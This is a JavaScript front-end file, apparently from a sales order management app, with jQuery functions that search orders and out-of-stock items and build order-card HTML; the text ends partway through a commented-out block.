var opts = {
	lines: 13, // The number of lines to draw
	length: 10, // The length of each line
	width: 4, // The line thickness
	radius: 11, // The radius of the inner circle
	rotate: 0, // The rotation offset
	color: '#000', // #rgb or #rrggbb
	speed: 0.6, // Rounds per second
	trail: 32, // Afterglow percentage
	shadow: false, // Whether to render a shadow
	hwaccel: false, // Whether to use hardware acceleration
	className: 'spinner', // The CSS class to assign to the spinner
	zIndex: 2e9, // The z-index (defaults to 2000000000)
	top: 'auto', // Top position relative to parent in px
	left: 'auto' // Left position relative to parent in px
};
var spinner;
function loadNoStockPage2(roleId, userId, dateFrom, dateTo, client) {
	var data = encodeURIComponent('{"getNoStockPage_data" :{ "userId":"' + userId + '","client":"' + client + '"}}');

	$("#dateFrom").datepicker({
		dateFormat: 'yy-mm-dd',
		onSelect: function (date) {
			var dateTo = $('#dateTo');
			var startDate = $(this).datepicker('getDate');

			dateTo.datepicker('option', 'minDate', startDate);
		}
	});

	$("#dateTo").datepicker({ dateFormat: 'yy-mm-dd' });
	$("#dateFrom").datepicker('setDate', dateFrom);
	$("#dateTo").datepicker('setDate', dateTo);
	$("#dateTo").datepicker('option', 'minDate', dateFrom);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getNoStockPage",
		success: function (msg) {
			var decodedJson = JSON.parse(msg);
			var data = Object.keys(decodedJson)
			var orderNo = 0;
			var divdis = '';
			var fulldiv = '';

			debugger;
			for (cust in data) {
				var cust_name = data[cust];
				var data_length = decodedJson[cust_name].length;
				var cnt = 1;

				for (item in decodedJson[cust_name]) {

					var product_name = decodedJson[cust_name][item].product_name;
					var quantity = decodedJson[cust_name][item].quantity;
					var cust_code = decodedJson[cust_name][item].cust_code;
					var cust_code2 = decodedJson[cust_name][item].cust_code;
					var message = decodedJson[cust_name][item].message;
					var packing_status = decodedJson[cust_name][item].packing_status;

					// escape back slash issue
					cust_code = cust_code.split('/').join('---');

					if (message == null) {
						if (packing_status == 2 || packing_status == 3) {
							message = "No stock"
						}
					}

					orderNo += 1;


					if (item == 0) {


						var pickedForm = '<input type="checkbox" name="picked" value="picked" style="height:25px;width:25px;" class="packing_checkbox pull-right" onclick="setAcknowledgeStatus2(\'' +
							cust_code2 + '\',\'' + userId + '\',this,3,\'' + client + '\')" id="item_' + orderNo + '" ';
						/*var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
						+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderName" rowspan="'+ data_length +'">'+ pickedForm +  cust_name  +'</td>'
						+ '<td style="width:30%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
						+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
						+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
						+ '</tr>';*/
						divdis = '<div class="list-group" id="noStock_' + cust_code + '"><a  class="list-group-item" style="background-color:#337AB7" ><h3 class="list-group-item-heading"style="color:white">' + cust_name + '<span>' + pickedForm + '</span></h3></a>'
							+ '	<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (data_length == 1) {
							divdis = '<div class="list-group" id="noStock_' + cust_code + '"><a  class="list-group-item" style="background-color:#337AB7;"><h3 class="list-group-item-heading" style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h3></a>'
								+ '	<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
								+ '</p><p class="list-group-item-text">' + message + '</p></a></div>';
						}



						/*itemsRepeat+='<a href="#" class="list-group-item"><h4 class="list-group-item-heading">'
								 +product_name+
								 '</h4><p class="list-group-item-text">'+quantity
								 +'</p><p class="list-group-item-text">'+message
								 +'</p></a>';*/


					}
					else {

						/*var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '" ><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
							+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
							+ '</tr>' ;*/
						cnt += 1;
						divdis = '<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (cnt == data_length) {
							divdis += '</div>';

						}

						/*itemsRepeat+='<a href="#" class="list-group-item"><h4 class="list-group-item-heading">'
							 +product_name+
							 '</h4><p class="list-group-item-text">'+quantity
							 +'</p><p class="list-group-item-text">'+message
							 +'</p></a>';*/

					}
					fulldiv += divdis;


					/*divdis+='<div class="list-group"><a href="#" class="list-group-item active"><h2 class="list-group-item-heading">' + cust_name +'</h4></a>'+
         					itemsRepeat+'</div>';*/






					$('#test').html(fulldiv);
					/*$('#noStockTableId').append(noStockRecord);*/
					if (message == "No stock") {
						// debugger;
						$(".noStock_" + cust_code + "." + orderNo + " .orderPrice").css("color", "red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderQuantity").css("color", "red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderMessage").css("color", "red");
					}
					else {
						$(".noStock_" + cust_code + "." + orderNo + " .orderPrice").css("color", "red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderQuantity").css("color", "red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderMessage").css("color", "red");
					}


				}




			}

		},
		error: function (xhr, ajaxOptions, thrownError) {

		}
	});
}

//below is the function after click search

function searchNoStock2(roleId, userId, client) {

	var selectedSalespersonId = userId;
	var datenewp = document.getElementById('curdate').value;
	sessionStorage.setItem("visited", datenewp);
	/*var visited=true;*/

	// var yearList = document.getElementById("yearList");

	// var selectedYear = yearList.options[yearList.selectedIndex].value;

	// var monthList = document.getElementById("monthList");

	// var selectedMonth = monthList.options[monthList.selectedIndex].value;

	// var dayList = document.getElementById("dayList");

	// var selectedDay = dayList.options[dayList.selectedIndex].value;
	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()


	// if( selectedYear == '' && selectedMonth == '' && selectedDay == '' )
	// {
	// 	alert("Please select a criteria to start search");

	// 	return;
	// }
	if (dateFrom == '' && dateTo == '') {
		alert("Please select date start search");

		return;
	}

	// var data = encodeURIComponent('{"searchNoStock_data" :{ "salespersonId":"' + selectedSalespersonId 
	// 								+ '","year":"' + selectedYear + '","month":"' + selectedMonth + '","day":"' + 
	// 								selectedDay  +'"}}');
	var data = encodeURIComponent('{"searchNoStock_data" :{ "salespersonId":"' + selectedSalespersonId
		+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","client":"' + client + '"}}');

	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=searchNoStock",
		success: function (msg) {
			// debugger;    	
			var decodedJson = JSON.parse(msg);
			var data = Object.keys(decodedJson)
			var orderNo = 0;
			var divdis = '';
			var fulldiv = '';
			$('.orderItemDetails').empty();
			// debugger;
			for (cust in data) {
				// console.log(data[cust])
				var cust_name = data[cust];
				var data_length = decodedJson[cust_name].length;
				var cnt = 1;

				for (item in decodedJson[cust_name]) {
					// console.log(decodedJson[data[cust]][item])

					var product_name = decodedJson[cust_name][item].product_name;
					var quantity = decodedJson[cust_name][item].quantity;
					var cust_code = decodedJson[cust_name][item].cust_code;
					var order_date = decodedJson[cust_name][item].order_date;
					var message = decodedJson[cust_name][item].message;
					var packing_status = decodedJson[cust_name][item].packing_status;
					if (packing_status == 2 || packing_status == 3) {
						message = "No stock"
					}
					// console.log(data_length);
					orderNo += 1;

					if (item == 0) {
						var pickedForm = '';
						divdis = '<div class="list-group"><a  class="list-group-item noStock_' + cust_code + '" style="background-color:#337AB7" id="noStock_' + cust_code + '"><h4 class="list-group-item-heading"style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h4></a>'
							+ '	<a  class="list-group-item"><h5 class="list-group-item-heading">' + product_name + '</h5><p class="list-group-item-text">' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (data_length == 1) {
							divdis = '<div class="list-group"><a  class="list-group-item " style="background-color:#337AB7;" id="noStock_' + cust_code + '"><h4 class="list-group-item-heading" style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h4></a>'
								+ '	<a  class="list-group-item"><h5 class="list-group-item-heading">' + product_name + '</h5><p class="list-group-item-text">QTY:' + quantity
								+ '</p><p class="list-group-item-text">' + message + '</p></a></div>';
						}
						//    			var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
						// + '<td style="width:40%; text-align:left; padding-left:10px;" class="orderName" rowspan="'+ data_length +'">'+ cust_name +'<br>' + order_date  +'</td>'
						// + '<td style="width:40%; text-align:left; padding-left:10px;" class="orderPrice">'+ product_name  + '</td>'
						// + '<td style="width:10%; text-align:left; padding-left:10px;" class="orderQuantity">'+ quantity  + '</td>'
						// + '</tr>' ;
					}
					else {
						// var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
						// 	+ '<td style="width:40%; text-align:left; padding-left:10px;" class="orderPrice">'+ product_name  + '</td>'
						// 	+ '<td style="width:10%; text-align:left; padding-left:10px;" class="orderQuantity">'+ quantity  + '</td>'
						// 	+ '</tr>' ;
						cnt += 1;
						divdis = '<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (cnt == data_length) {
							divdis += '</div>';

						}

					}
					console.log(divdis);
					fulldiv += divdis;
					console.log(fulldiv);
					$('#test').html(fulldiv);
				}
			}

			spinner.stop();
			$('#mydiv').remove();
			// $('#mydiv').remove(); 
		},
		error: function (xhr, ajaxOptions, thrownError) {
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}

//checkbox clear data
function setAcknowledgeStatus2(custCode, userId, cb, status, client) {
	if (cb.checked) {
		var data = encodeURIComponent('{"setAcknowledgeStatus_data" :{ "custCode":"' + custCode + '","userId":"'
			+ userId + '","status":"' + status + '","client":"' + client + '"}}');

		jQuery.ajax({
			type: "POST",
			url: "./api.php",
			data: "data=" + data + "&action=setAcknowledgeStatus",
			success: function (msg) {
				// debugger;
				var decodedJson = JSON.parse(msg);

				// escape back slash issue
				var cust_code = decodedJson.custCode.split('/').join('---');

				if (decodedJson.result == 0) {
					console.log('.noStock_' + cust_code);
					$("#noStock_" + cust_code).toggle();
					//document.getElementById('.noStock_'+ cust_code).style.display="none";
					//$('.noStock_'+ cust_code ).hide();
				}
			},
			error: function (xhr, ajaxOptions, thrownError) {

			}
		});
	}
}


//transferred order search function
function loadOrdersPage2(client, roleId, userId, dateFrom, dateTo, customer, orderStatus, deliveryDateFrom, deliveryDateTo) {
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	loadFilterList();

	// set list value
	document.getElementById("cancelList").value = orderStatus;

	if (deliveryDateFrom != "") {
		$("#deliveryDateFrom").datepicker('setDate', deliveryDateFrom);
	}

	if (deliveryDateTo != "") {
		$("#deliveryDateTo").datepicker('setDate', deliveryDateTo);
	}

	$("#dateFrom").datepicker({
		dateFormat: 'yy-mm-dd',
		onSelect: function (date) {
			var dateTo = $('#dateTo');
			var startDate = $(this).datepicker('getDate');
			dateTo.datepicker('option', 'minDate', startDate);
		}
	});

	$("#dateTo").datepicker({ dateFormat: 'yy-mm-dd' });
	$("#dateFrom").datepicker('setDate', dateFrom);
	$("#dateTo").datepicker('setDate', dateTo);
	$("#dateTo").datepicker('option', 'minDate', dateFrom);

	var data = encodeURIComponent('{"getAllSalespersonCustomerlist_data" :{ "salespersonid":"' + userId + '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getAllSalespersonCustomerlist",
		success: function (msg) {

			var decodedJson = JSON.parse(msg);
			var data = decodedJson.data;

			for (var element in data) {
				if (data[element].value == customer) {
					$("#customerList").val(data[element].label);
					$("#customerListID").val(data[element].value);
				}
			}

			$('#customerList').autocomplete({
				source: data,
				select: function (event, ui) {
					event.preventDefault();
					$("#customerList").val(ui.item.label); // display the selected text
					$("#customerListID").val(ui.item.value); // save selected id to hidden input
				}
			});

			searchOrder2(roleId, userId, client);
		},
		error: function (xhr, ajaxOptions, thrownError) {

		}
	})
}


function searchOrder2(roleId, userId, client) {
	// get selected value of 4 drop down list	
	if ($('#order-cancel-check').is(':checked')) {
		var showCancel = 1;
	}
	else {
		var showCancel = 0;
	}

	var selectedSalespersonId = userId;
	var datenewp = document.getElementById('curdate').value;
	sessionStorage.setItem("visited", datenewp);
	var datedeli = document.getElementById('curdate2').value;
	sessionStorage.setItem("deliverys", datedeli);

	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()

	var deliveryDateFrom = $('#deliveryDateFrom').val();
	var deliveryDateTo = $('#deliveryDateTo').val()

	var orderList = document.getElementById("cancelList");
	var orderStatus =orderList.options[orderList.selectedIndex].value;

	var customerList = document.getElementById("customerList");
	var customerStatus = '';

	if (customerList.value != "") {
		customerStatus = $('#customerListID').val();
	}



	if (deliveryDateFrom == '' && deliveryDateTo == '' && dateFrom == '' && dateTo == '' && orderStatus == '' && customerStatus == '') {
		alert("Please select a criteria to start search");

		spinner.stop();
		$('#mydiv').remove();

		return;
	}

	var data = encodeURIComponent('{"searchOrders_data" :{ "salespersonId":"' + selectedSalespersonId + '","showCancel":"' + showCancel
		+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","order_status":"'
		+ orderStatus + '","customer_status":"' + customerStatus
		+ '","deliveryDateFrom":"' + deliveryDateFrom + '","deliveryDateTo":"' + deliveryDateTo + '","client":"' + client + '"}}');
	// debugger;									
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=searchOrders",
		success: function (msg) {
			
			//debugger;
			var decodedJson = JSON.parse(msg);

			//console.warn(JSON.stringify(decodedJson));

			var data = decodedJson.currency_data;
			var currency = '';

			for (var i = 0; i < data.length; i++) {
				currency = data[i].currency;
			}

			document.getElementById("currency").value = currency;

			var data = decodedJson.data;
			var deliveryInfo = decodedJson.delivery_info;
			var enable_deliver_date = decodedJson.enable_deliver_date;


			if (data != false && data != undefined) {
				$('#ordersTableId').empty();
				$('#ordersTableQNEId').empty();
				$('#ordersTableComfirmedId').empty();

				initOrderTable2(data, roleId, userId, deliveryInfo, enable_deliver_date, client);
			}
			else {
				$('#ordersTableId').empty();
				$('#ordersTableQNEId').empty();
				$('#ordersTableComfirmedId').empty();

				// alert('No order found');
			}

			spinner.stop();
			$('#mydiv').remove();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError) {
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}


//for displaying record after search (transfer enquiry)
function initOrderTable2(data, roleId, userId, deliveryInfo, enable_deliver_date, client) {
	var currency = document.getElementById("currency").value;

	var header = '<tr class="orderTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Order No</td>'
		+ '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>'
		+ '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
		+ '<td style="text-align:left; padding-left:5px;">Status</td><td style="text-align:left; padding-left:5px;">Picking Status</td></tr>';

	var header2 = '<tr class="orderTableHeader"><td style="text-align:left; padding-left:5px;">No.</td><td style="text-align:left; padding-left:5px;">Sales Order No</td>'
		+ '<td style="text-align:left; padding-left:5px;">Created Date</td><td style="text-align:left; padding-left:5px;">Sales Agent</td>'
		+ '<td style="text-align:left; padding-left:5px;">Total Amount</td><td style="text-align:left;">Last Update (Agent)</td><td style="text-align:left;">Internal Last Update</td>'
		+ '<td style="text-align:left; padding-left:5px;">Picking Status</td><td style="text-align:left; padding-left:5px;"></td></tr>';
	var orderkey = 0;
	var comfirmkey = 0;
	var sentkey = 0;
	var totalAmount_cart = 0;
	var totalAmount_confirmed = 0;
	var totalAmount_qne = 0;

	//$('#ordersTableId').append(header);
	//$('#ordersTableQNEId').append(header2);
	//$('#ordersTableComfirmedId').append(header);

	for (var i = 0; i < data.length; i++) {
		var orderId = data[i].order_id;
		var cust_company_name = data[i].cust_company_name;
		var branch_name = data[i].branch_name ? ' ('+data[i].branch_name+')' : '';
		var orderDate = data[i].order_date;
		var deliveryDate = data[i].delivery_date;
		var salesAgent = data[i].sales_agent
		var grandTotal = data[i].grand_total;
		var orderStatus = data[i].order_status;
		var cancelStatus = data[i].cancel_status;
		var packingStatus = data[i].packing_status;
		var orderStatusLastUpdateDate = data[i].order_status_last_update_date;
		var orderStatusLastUpdateBy = data[i].order_status_last_update_by;
		var orderInternalUpdate = data[i].internal_updated_at;
		var orderDeliveryNote = data[i].order_delivery_note;
		var statusMsg, lastUpdateByWhenAndWho = '';
		var deliveryMessage = data[i].delivery_info;

		orderStatusLastUpdateDate = orderStatusLastUpdateDate;
		lastUpdateByWhenAndWho = orderStatusLastUpdateBy + '| ' + orderInternalUpdate;

		orderDate = orderDate.substr(0, 10);
		// debugger

		//console.warn(branch_name);

		if (orderStatus == 0) {

			orderkey += 1;
			if (cancelStatus == 0) {
				totalAmount_cart += Number(grandTotal);
				cancelStatus = '<td style="padding:5px; border:none ;width:8%;" class="cancelStatus"> Active <br><b style="background-color:yellow;">';
				if (enable_deliver_date == 1) {
					cancelStatus += '<br>Delivery date :' + deliveryDate+'['+ orderDeliveryNote+']';
				}
				cancelStatus += ' </b></td>';
			}
			else if (cancelStatus == 1) {
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
			}
			else {
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
			}

			// if (packingStatus == 0)
			// {
			// 	packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
			// }
			// else 
			if (packingStatus == 1) {
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong></td>';
			}
			else if (packingStatus == 2) {
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong></td>';
			}
			else {
				packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong></td>';
			}
			/*var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
				  orderkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
				  + '\')" >' + orderId + '<br>' + cust_company_name + '<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
				  + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
				  + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
				  '</form></a></div></td><td style="padding:5px;border:none; width:8%; text-align:left;">' +
				  orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
				  salesAgent + '</td>' + '<td style="padding:5px;border:none; width:8%; text-align:left;" class="orderCurrency">' 
				  + currency + " " + Number(grandTotal).toFixed(2) + '</td>' 
				  + '<td style="padding:5px;border:none; width:9%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
				  + '<td style="padding:5px;border:none; width:17%; text-align:left;" class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
				  + cancelStatus
				  + packingStatus + '</tr>';*/
			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewOrderPage(\'form' + i + '\')" style="text-decoration: underline;"  >' + cust_company_name + branch_name +'</h3>'
				+ '<p onclick="redirectToViewOrderPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewOrderPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="orderId" name="orderId" value="' + orderId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId + '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >Create :' + orderDate + '</p>'
				+ '  <p class="list-group-item-text">Last Update :' + salesAgent + ' | ' + orderStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text">Internal Update :' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;">' + cancelStatus + ' </p>'
				+ '	<p class="list-group-item-text" style="color:#FF0000;">' + packingStatus + ' </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';

			$('#ordersTableId').append(newrecord);
		}
		else if (orderStatus == 1) {

			comfirmkey += 1;
			if (cancelStatus == 0) {
				totalAmount_confirmed += Number(grandTotal);
				cancelStatus = '<td style="padding:5px; border:none ;width:15%;" class="cancelStatus"><b style="background-color:yellow;">';
					
				if (enable_deliver_date == 1) {
					cancelStatus += '<br>Delivery Date :' + deliveryDate +'['+ orderDeliveryNote+']';
				}
				cancelStatus += ' </b>';
				if (deliveryInfo == 1) {
					var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
					cancelStatus += '<br><div id="delivery-info-' + orderId + '">';
					if (deliveryMessage == null) {
						deliveryMessage = '';
					}
					else {
						cancelStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
					}
					cancelStatus += '<button class="btn btn-primary" type="button" style="width:100px;height:30px;border-radius: 25px;"  onclick="openMessageBoxDelivery2(\'' + orderId + ',desktop\')" >Delivery Info</button></div>';
					cancelStatus += '<div id="message-popup-' + orderId + '" title="Delivery Info for order ' + orderId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="' + deliveryPlaceholder + '">' +
						deliveryMessage + '</p></div>';console.log(orderId);
				}
				cancelStatus += '</td>'
			}
			else if (cancelStatus == 1) {
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by agent</i></td>';
			}
			else {
				grandTotal = 0;
				cancelStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="cancelStatus"><i>Deleted by admin</i></td>';
			}

			// if (packingStatus == 0)
			// {
			// 	packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
			// }
			// else 
			// debugger;
			if (packingStatus == 1) {
				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong></td>';
			}
			else if (packingStatus == 2) {

				packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong></td>';
			}
			else {
				packingStatus = '<td style="padding:5px; border:none ;width:8%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong></td>';
			}

			/*var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
				  comfirmkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
				  + '\')" >' + orderId + '<br>' + cust_company_name + '<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
				  + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
				  + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
				  '</form></a></div></td><td style="padding:5px;border:none; width:8%; text-align:left;">' +
				  orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
				  salesAgent + '</td>' + '<td style="padding:5px;border:none; width:8%; text-align:left;" class="orderCurrency">' 
				  + currency + " " + Number(grandTotal).toFixed(2) + '</td>' + '<td style="padding:5px;border:none; width:9%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
				  + '<td style="padding:5px;border:none; width:17%; text-align:left;"  class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
				  + cancelStatus
				  + packingStatus + '</tr>';*/

			//$('#ordersTableComfirmedId').append(record);
			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewOrderPage(\'form' + i + '\')" style="text-decoration: underline;">' + cust_company_name + branch_name + '</h3>'
				+ '<p onclick="redirectToViewOrderPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewOrderPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="orderId" name="orderId" value="' + orderId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId + '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >Create :' + orderDate + '</p>'
				+ '  <p class="list-group-item-text">Last Update :' + salesAgent + ' | ' + orderStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text">Internal Update :' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;"> ' + cancelStatus + ' </p>'
				+ '	<p class="list-group-item-text" style="color:#FF0000;">' + packingStatus + ' </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';
			$('#ordersTableComfirmedId').append(newrecord);
		}
		else if (orderStatus == 2) {
			totalAmount_qne += Number(grandTotal);
			sentkey += 1;
			// if (packingStatus == 0)
			// 	{
			// 		packingStatus = '<td style="padding:5px; border:none ;width:8%;" class="packingStatus"></td>';
			// 	}
			// 	else 
			if (packingStatus == 1) {
				packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus"><strong style="font-size: 20px;">Completed</strong><br><b style="background-color:yellow;">';
				if (enable_deliver_date == 1) {
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ orderDeliveryNote+']';
				}
				packingStatus += ' </b>';
			}
			else if (packingStatus == 2) {
				packingStatus = '<td style="padding:5px; border:none ;width:15%;" class="packingStatus"><strong style="font-size: 20px;">Completed (partial no stock)</strong><br><b style="background-color:yellow;">';
				if (enable_deliver_date == 1) {
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ orderDeliveryNote+']';
				}
				packingStatus += ' </b>';
			}
			else {
				packingStatus = '<td style="padding:5px; border:none ;width:15%; color:red;" class="packingStatus"><strong style="font-size: 20px;">!!!</strong><br><b style="background-color:yellow;">';
				if (enable_deliver_date == 1) {
					packingStatus += '<br>Delivery Date :' + deliveryDate+'['+ orderDeliveryNote+']';
				}
				packingStatus += ' </b>';
			}

			if (deliveryInfo == 1) {
				var deliveryPlaceholder = '1. lorry plate no. \n2. lorry driver. \n3. delivery date. \n4. lorry contact';
				packingStatus += '<br><div id="delivery-info-' + orderId + '">';
				if (deliveryMessage == null) {
					deliveryMessage = '';
				}
				else {
					packingStatus += '<span class="glyphicon glyphicon-ok" aria-hidden="true"> </span>';
				}
				packingStatus += '<button class="btn btn-primary" type="button" style="width:100px;height:30px;border-radius: 25px;"  onclick="openMessageBoxDelivery2(\'' + orderId + ',desktop\')" >Delivery Info</button></div>';
				packingStatus += '<div id="message-popup-' + orderId + '" title="Delivery Info for order ' + orderId + '" style="display:none;"><p id="text-message" style="width:350px;height:200px;" placeholder="' + deliveryPlaceholder + '">' +
					deliveryMessage + '</p></div>';console.log(orderId);
			}
			packingStatus += '</td>'

			/*var record = '<tr id = "' + orderId + '" class="orderRow"><td style="padding:5px;border:none; width:3%; text-align:left;" class="orderNo">' +
	                sentkey + '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"><div class="order-page-link"><a href="#" onclick="redirectToViewOrderPage(\'form' + i
	                + '\')" >' + orderId + '<br>' + cust_company_name +'<form style="display: hidden" action="viewOrderPage.php" method="POST" id="form'
	                + i + '">' + '<input type="hidden" id="orderId" name="orderId" value="' + orderId
